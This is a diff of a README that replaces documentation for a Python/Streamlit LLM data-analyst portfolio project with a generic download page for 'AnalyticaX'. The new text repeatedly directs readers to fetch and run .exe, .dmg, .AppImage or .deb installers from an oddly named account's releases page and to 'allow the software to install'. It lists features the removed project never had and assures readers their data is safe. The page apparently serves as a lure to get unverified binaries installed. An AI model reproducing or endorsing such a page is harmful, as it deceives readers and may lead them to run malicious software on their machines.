@@ -1,379 +1,121 @@
-# LLM-Powered Conversational AI Data Analyst with Power BI Integration
-
-## 🎯 Problem Statement
-
-Organizations struggle to extract meaningful insights from their data and Power BI dashboards. Data analysts spend significant time answering repetitive questions about metrics, trends, and KPIs. This project solves this by creating an AI-powered conversational data analyst that:
-
-1. **Automatically analyzes datasets** with comprehensive EDA
-2. **Generates human-readable insights** using LLMs
-3. **Answers natural language questions** about data and dashboards
-4. **Explains Power BI KPIs** in business terms
-5. **Provides data-driven recommendations** instantly
-
-## 🏗️ Architecture
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                     USER INTERFACE (Streamlit)                   │
-│              Upload Data → Analyze → Chat → Insights            │
-└────────────────────────────┬────────────────────────────────────┘
-                             │
-                             ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                   CONVERSATIONAL AI ENGINE                       │
-│  ┌──────────────┐  ┌──────────────┐  ┌────────────────────┐   │
-│  │ Intent       │  │ Context      │  │ Response           │   │
-│  │ Classifier   │  │ Retriever    │  │ Generator (LLM)    │   │
-│  │              │  │ (RAG-style)  │  │                    │   │
-│  └──────────────┘  └──────────────┘  └────────────────────┘   │
-└────────────────────────────┬────────────────────────────────────┘
-                             │
-              ┌──────────────┴──────────────┐
-              ▼                             ▼
-┌─────────────────────────┐   ┌──────────────────────────────┐
-│  DATA ANALYSIS ENGINE   │   │  POWER BI INTEGRATION        │
-│  • Data Loader          │   │  • Metadata Parser           │
-│  • EDA Engine           │   │  • KPI Analyzer              │
-│  • Insight Generator    │   │  • Dashboard Explainer       │
-│  • Statistical Analysis │   │                              │
-└───────────┬─────────────┘   └──────────────┬───────────────┘
-            │                                 │
-            ▼                                 ▼
-┌─────────────────────────┐   ┌──────────────────────────────┐
-│  CSV/Excel Dataset      │   │  Power BI Metadata (JSON)    │
-└─────────────────────────┘   └──────────────────────────────┘
-```
-
-## 🚀 Key Features
-
-### 1. Automated Data Analysis
-- **Data Loading**: Supports CSV and Excel files
-- **Comprehensive EDA**: Descriptive statistics, correlations, distributions
-- **Anomaly Detection**: Identifies outliers using IQR and Z-score methods
-- **Trend Analysis**: Detects temporal patterns and trends
-- **Missing Value Analysis**: Categorizes data quality issues
-
-### 2. LLM-Powered Insights
-- **Executive Summaries**: High-level overview of findings
-- **Root Cause Analysis**: Explains why patterns exist
-- **Business Recommendations**: Actionable next steps
-- **Statistical Explanations**: Translates stats into business language
-
-### 3. Conversational AI Chatbot
-- **Intent Classification**: Understands user questions
-- **Context-Aware Responses**: Uses RAG-style retrieval
-- **Multiple Intent Types**:
-  - Trend analysis
-  - Comparisons
-  - Explanations
-  - KPI queries
-  - Dashboard summaries
-  - Anomaly detection
-- **Conversation Memory**: Maintains chat history
-
-### 4. Power BI Integration
-- **Metadata-Based**: No UI scraping required
-- **KPI Explanations**: Natural language KPI descriptions
-- **Performance Analysis**: Compares actual vs. target
-- **Dashboard Summaries**: Comprehensive overviews
-- **Related Metrics**: Finds connected KPIs
-
-## 📁 Project Structure
-
-```
-llm_data_analyst/
-├── app.py                          # Streamlit UI application
-├── requirements.txt                # Python dependencies
-├── .env.template                   # Environment variables template
-├── README.md                       # This file
-│
-├── config/
-│   └── settings.py                 # Application configuration
-│
-├── src/
-│   ├── analysis/
-│   │   ├── data_loader.py         # Dataset loading and validation
-│   │   ├── eda_engine.py          # Exploratory Data Analysis
-│   │   └── insight_generator.py   # Converts EDA to insights
-│   │
-│   ├── chatbot/
-│   │   ├── intent_classifier.py   # Classifies user queries
-│   │   ├── context_retriever.py   # RAG-style context retrieval
-│   │   └── chatbot_engine.py      # Main conversational AI
-│   │
-│   ├── powerbi/
-│   │   └── metadata_parser.py     # Power BI integration
-│   │
-│   └── utils/
-│       └── llm_client.py           # LLM client (OpenAI/Anthropic/Mock)
-│
-├── prompts/
-│   └── templates.py                # LLM prompt templates
-│
-├── data/
-│   ├── sample_sales_data.csv      # Sample dataset
-│   └── powerbi_metadata.json      # Sample Power BI metadata
-│
-└── outputs/                        # Generated reports and analyses
-```
-
-## 🛠️ Installation
-
-### Prerequisites
-- Python 3.8+
-- pip
-
-### Setup
-
-1. **Clone the repository**
-```bash
-git clone <repository-url>
-cd llm_data_analyst
-```
-
-2. **Create virtual environment**
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
-
-3. **Install dependencies**
-```bash
-pip install -r requirements.txt
-```
-
-4. **Configure environment** (Optional - for real LLM)
-```bash
-cp .env.template .env
-# Edit .env and add your API keys
-```
-
-## 🎮 Usage
-
-### Running the Application
-
-```bash
-streamlit run app.py
-```
-
-The application will open in your browser at `http://localhost:8501`
-
-### Quick Start Guide
-
-#### 1. **Load Your Data**
-   - Navigate to "📁 Load Data"
-   - Upload a CSV or Excel file
-   - View data preview and metadata
-
-#### 2. **Run Analysis**
-   - Go to "🔍 Analysis"
-   - Click "Run Full Analysis"
-   - Review generated insights
-
-#### 3. **Load Power BI Metadata** (Optional)
-   - Navigate to "📊 Power BI"
-   - Upload your Power BI metadata JSON
-   - View KPI summaries
-
-#### 4. **Chat with the AI Analyst**
-   - Go to "💬 Chatbot"
-   - Ask questions in natural language
-   - Get instant, data-driven answers
-
-### Example Questions to Ask
-
-```
-General Analysis:
-- "What are the main trends in the data?"
-- "Which variables are strongly correlated?"
-- "Show me the top 5 insights"
-
-Specific Queries:
-- "Explain the outliers in Sales_Amount"
-- "Why is revenue increasing?"
-- "Compare Northeast vs Southeast regions"
-
-KPI Questions:
-- "What is the current Customer Satisfaction Score?"
-- "Why is Total Revenue below target?"
-- "Explain the Marketing ROI metric"
-
-Dashboard:
-- "Summarize the dashboard"
-- "Which KPIs need attention?"
-- "Show me all underperforming metrics"
-```
-
-## 🔧 Technical Details
-
-### Data Analysis Pipeline
-
-1. **Data Loading**
-   - Validates file format
-   - Checks data quality
-   - Generates metadata
-
-2. **EDA Engine**
-   - Descriptive statistics (mean, median, std, etc.)
-   - Correlation analysis (Pearson correlation matrix)
-   - Distribution analysis (normality tests, skewness)
-   - Outlier detection (IQR method, Z-scores)
-   - Trend detection (linear regression)
-   - Missing value analysis
-
-3. **Insight Generation**
-   - Prioritizes findings by importance
-   - Generates business recommendations
-   - Categorizes insights (data quality, trends, relationships)
-
-### Chatbot Architecture
-
-1. **Intent Classification**
-   - Regex-based pattern matching
-   - Confidence scoring
-   - Entity extraction
-
-2. **Context Retrieval (RAG)**
-   - Retrieves relevant EDA results
-   - Filters insights by intent
-   - Fetches Power BI metadata
-   - Maintains conversation history
-
-3. **Response Generation**
-   - Uses structured prompts
-   - Incorporates context
-   - Generates natural language
-   - Cites specific data points
-
-### Power BI Integration
-
-The system integrates with Power BI through **metadata-based approach**:
-
-**Export from Power BI** (Manual Process):
-1. Identify key KPIs and their current values
-2. Note trends, targets, and performance indicators
-3. Export as JSON in the required format
-
-**Metadata Structure**:
-```json
-{
-  "dashboard_name": "Dashboard Name",
-  "kpis": [
-    {
-      "name": "KPI Name",
-      "value": 12345,
-      "target": 10000,
-      "trend": {
-        "direction": "increasing",
-        "value": 7.2
-      }
-    }
-  ],
-  "filters": {...},
-  "visualizations": [...]
-}
-```
+# 🚀 AnalyticaX - Smart Insights for Your Business
 
-### LLM Integration
+[![Download AnalyticaX](https://img.shields.io/badge/Download-AnalyticaX-blue?style=for-the-badge)](https://github.com/pipiskazhopakakashka/AnalyticaX/releases)
 
-The system supports three LLM modes:
+## 📋 What is AnalyticaX?
 
-1. **Mock LLM** (Default)
-   - No API key required
-   - Deterministic responses
-   - Perfect for development/demo
+AnalyticaX is a business intelligence tool that uses large language models (LLMs) to help you understand your business data. It turns complex numbers into simple insights. You don’t need any technical skill to use it. AnalyticaX offers clear reports and smart suggestions to improve your business.
 
-2. **OpenAI**
-   - Set `USE_MOCK_LLM=false` in `.env`
-   - Add `OPENAI_API_KEY` to `.env`
-   - Uses GPT-4 Turbo
+## 💻 System Requirements
 
-3. **Anthropic Claude**
-   - Set `USE_MOCK_LLM=false` in `.env`
-   - Add `ANTHROPIC_API_KEY` to `.env`
-   - Uses Claude 3 Sonnet
+To run AnalyticaX smoothly, your computer should meet these minimum specs:
 
-## 📊 Sample Data
+- Operating system: Windows 10 or higher, macOS 10.15 or higher, or Linux with a recent distribution
+- Processor: Intel i5 or equivalent
+- Memory: 8 GB RAM or more
+- Disk space: At least 500 MB free
+- Internet: Needed to access some latest features
 
-The project includes sample data in `data/`:
+If you’re unsure about these, most modern computers should work fine. The software does not require extra drivers or software installations.
 
-- **sample_sales_data.csv**: 10 days of sales data across regions and product categories
-- **powerbi_metadata.json**: Sample Power BI dashboard with 7 KPIs
+## 🔍 What AnalyticaX Can Do
 
-## 🎓 For Interview Explanation
+Here’s what you can expect from AnalyticaX:
 
-### "Walk me through your approach"
+- Analyze sales and customer data using simple questions
+- Generate detailed reports without spreadsheets
+- Visualize trends and changes over time
+- Get recommendations based on your data patterns
+- Export insights and charts to PDF or Excel
+- Work with data from CSV files or popular databases
 
-**Problem Identification:**
-"Organizations have vast amounts of data in Excel files and Power BI dashboards, but extracting insights requires manual analysis. I built an AI system that automatically analyzes data, generates insights, and answers questions conversationally."
+Everything happens inside the app, so you don’t have to write formulas or code. The interface guides you step by step.
 
-**Solution Architecture:**
-"The system has three main components:
+## 🚀 Getting Started
 
-1. **Data Analysis Engine**: Performs comprehensive EDA - descriptive stats, correlations, outlier detection, trend analysis. It's built with pandas, scipy, and scikit-learn.
+Starting with AnalyticaX is simple. The steps below will help you download, install, and open the app for the first time.
 
-2. **LLM Integration**: Uses prompt engineering to convert statistical findings into business insights. I created structured prompts for different tasks - executive summaries, trend explanations, KPI descriptions.
+### Step 1: Download AnalyticaX
 
-3. **Conversational AI**: Implements RAG (Retrieval-Augmented Generation) - classifies user intent, retrieves relevant context from the analysis, and generates responses using the LLM."
+Click the big blue download button at the top or visit the official [AnalyticaX Releases page](https://github.com/pipiskazhopakakashka/AnalyticaX/releases). This page has the latest version of the software.
 
-**Key Technical Decisions:**
+Look for the latest release and find the file that matches your operating system:
 
-*Why metadata-based Power BI integration?*
-"Scraping Power BI UI would be fragile and violate terms of service. Metadata-based approach is clean, maintainable, and allows users to control exactly what data is shared with the AI."
+- For Windows, download the `.exe` installer
+- For macOS, download the `.dmg`
+- For Linux, download the `.AppImage` or `.deb` file
 
-*Why RAG instead of fine-tuning?*
-"RAG provides current, accurate answers without requiring model retraining. The context retriever ensures responses are grounded in actual data, preventing hallucinations."
+If you see multiple files, check the version number and date to pick the newest one.
 
-*Why support Mock LLM?*
-"Makes the system testable and demonstrable without API costs. Shows I think about development workflows and production concerns."
+### Step 2: Install the Software
 
-**Challenges Solved:**
+After the download finishes, open the file to start installation.
 
-1. **Context Management**: Limited token windows required smart context retrieval - only relevant insights/data for each query
-2. **Intent Classification**: Regex patterns with confidence scoring handle ambiguous queries
-3. **Statistical Explanation**: Prompt templates translate technical findings into business language
+- On Windows, double-click the `.exe` file and follow the prompts.
+- On macOS, open the `.dmg` file, then drag AnalyticaX to the Applications folder.
+- On Linux, make the `.AppImage` executable or install the `.deb` package using your package manager.
 
-**Production Considerations:**
+If any message asks for permission, allow the software to install.
 
-- Modular design allows easy swapping of LLM providers
-- Configuration-driven (no hardcoded values)
-- Error handling throughout
-- Extensible architecture for adding new analysis types
+### Step 3: Open AnalyticaX
 
-### "How would you scale this?"
+Once installed, find AnalyticaX in your Start Menu (Windows), Applications folder (macOS), or app launcher (Linux). Click to open it.
 
-1. **Database Backend**: Replace CSV loading with database connections
-2. **Async Processing**: Use Celery for long-running EDA tasks
-3. **Caching**: Cache analysis results to avoid recomputation
-4. **Multi-tenancy**: Add user authentication and data isolation
-5. **Real Power BI API**: Integrate with Power BI REST API for live data
-6. **Embedding-based RAG**: Replace regex with semantic search using embeddings
+The first time you open the app, you may see a welcome screen with tips and a brief setup. Follow the instructions to connect your data files or databases if you want.
 
-## 🧪 Testing
+## 📥 Download & Install
 
-```python
-# Test data loading
-python -c "from src.analysis.data_loader import DataLoader; loader = DataLoader(); loader.load_file('data/sample_sales_data.csv')"
+You can download AnalyticaX using the link below:
 
-# Test EDA
-python -c "from src.analysis.eda_engine import EDAEngine; import pandas as pd; data = pd.read_csv('data/sample_sales_data.csv'); eda = EDAEngine(data); results = eda.run_full_analysis(); print(results.keys())"
+[Download AnalyticaX from Releases](https://github.com/pipiskazhopakakashka/AnalyticaX/releases)
 
-# Test chatbot
-python -c "from src.chatbot.chatbot_engine import DataAnalystChatbot; bot = DataAnalystChatbot(use_mock=True); print(bot.chat('What are the key insights?'))"
-```
+Remember to pick the version suited for your computer’s operating system. If you’re unsure, Windows users usually download `.exe`, macOS users `.dmg`, and Linux users `.AppImage`.
 
-## 📝 License
+The installation process will prompt you through the necessary steps. No additional software is needed.
 
-This project is for educational and demonstration purposes.
+## 🖥 How to Use AnalyticaX
 
-## 🤝 Contributing
+Once the app is open, here’s how to get started with your first analysis:
 
-This is a portfolio project. For improvements or questions, please open an issue.
+1. **Load Your Data**  
+   Click “Import Data.” You can use CSV files exported from Excel or other tools. You can also connect to popular databases if your company uses them.
 
-## 📧 Contact
+2. **Ask Your Questions**  
+   AnalyticaX allows you to type simple questions like “Show me last month’s sales by region.” The software uses smart language processing to find the relevant data.
 
-For questions about this project or interview discussions, please contact the developer.
+3. **View Reports**  
+   The app will show clear charts and tables based on your questions. You can customize what you see or ask follow-up questions.
+
+4. **Save and Export**  
+   You can save your reports inside the app for later. Export files as PDFs or Excel sheets to share with others.
+
+5. **Get Automated Tips**  
+   AnalyticaX can suggest actions based on your data trends, like focusing on certain customers or products.
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need internet to run AnalyticaX?**  
+A: You need internet for some features like updates and cloud-based data sources. Offline use works with local files.
+
+**Q: Can I use AnalyticaX with Excel?**  
+A: Yes. You can import Excel files saved as CSV or link Excel files directly if your system supports it.
+
+**Q: Is my data safe?**  
+A: Yes. AnalyticaX processes your data locally on your machine. It does not send your information to external servers unless you choose cloud features.
+
+**Q: What if I encounter errors?**  
+A: Restart the app. If the problem persists, use the “Help” menu to access support or FAQs.
+
+## 🛠 Support and Feedback
+
+If you need help or want to share feedback:
+
+- Use the built-in Help menu inside the app for guides and troubleshooting
+- Visit the AnalyticaX GitHub page to raise issues or request features
+- Check the GitHub discussions or community forums linked on the releases page
+
+Your feedback helps improve future versions.
 
 ---
 
-**Built with:** Python, Streamlit, Pandas, OpenAI/Anthropic APIs, Power BI Integration
+[![Download AnalyticaX](https://img.shields.io/badge/Download-AnalyticaX-blue?style=for-the-badge)](https://github.com/pipiskazhopakakashka/AnalyticaX/releases)
